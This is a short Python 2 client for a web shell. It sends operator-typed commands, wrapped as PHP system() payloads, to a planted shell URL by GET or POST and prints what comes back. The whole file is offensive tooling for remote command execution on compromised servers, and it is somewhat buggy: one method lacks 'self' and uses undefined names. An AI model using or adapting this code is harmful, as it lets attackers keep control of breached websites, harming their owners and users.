import requests


class shell:
    def __init__(self, headers, shell_path, shell_password):
        self.headers = headers
        self.path = shell_path
        self.passwrod = shell_password

    def check():
        print("[*] The shell url: " + shell_path)
        print("[*] The shell password: " + shell_password)

    def get_mange(self, shell_path, shell_password):
        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    getData = {shell_password: payload}
                    r = requests.get(shell_path, params=getData)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError:
                print("[*] type 'exit' to quit")
                pass

    def post_manage(self):
        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    postData = {self.passwrod: payload}
                    r = requests.post(self.path, data=postData)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError:
                print("[*] type 'exit' to quit")
                pass